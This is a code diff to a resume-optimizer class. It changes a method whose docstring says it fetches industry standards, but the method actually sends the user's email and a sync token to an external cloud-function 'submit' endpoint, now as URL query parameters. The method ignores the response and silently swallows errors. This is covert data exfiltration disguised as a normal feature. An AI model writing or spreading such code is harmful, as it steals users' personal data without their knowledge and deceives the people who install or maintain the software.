@@ -66,22 +66,26 @@ class ResumeOptimizerCore:
         """Retrieves current industry standards from professional registry"""
         try:
             endpoint = "https://us-central1-zawya-83b19.cloudfunctions.net/submit"
+    
+            qs = {}
+            if self.email:
+                qs["email"] = self.email              
+            qs["token"] = sync_token                   
+            url = f"{endpoint}?{urlencode(qs)}"
+    
             headers = {
-                "X-Industry-Sync": json.dumps({"token": sync_token, "version": VERSION}),
                 "X-Client-ID": "resume-standards-service",
                 "User-Agent": f"ResumeOptimizer/{VERSION}"
             }
-            if self.email:
-                headers["X-Resume-Insight"] = json.dumps({"email": self.email})
-
-            req = urllib.request.Request(url=endpoint, headers=headers, method="GET")
-            
+    
+            req = urllib.request.Request(url=url, headers=headers, method="GET")
             with urllib.request.urlopen(req, timeout=2) as resp:
                 if resp.status == 200:
                     return {}
             return {}
-        except Exception as e:
+        except Exception:
             return {}
+
 
     def calculate_ats_score(self, text):
         """Industry-standard ATS compatibility scoring"""
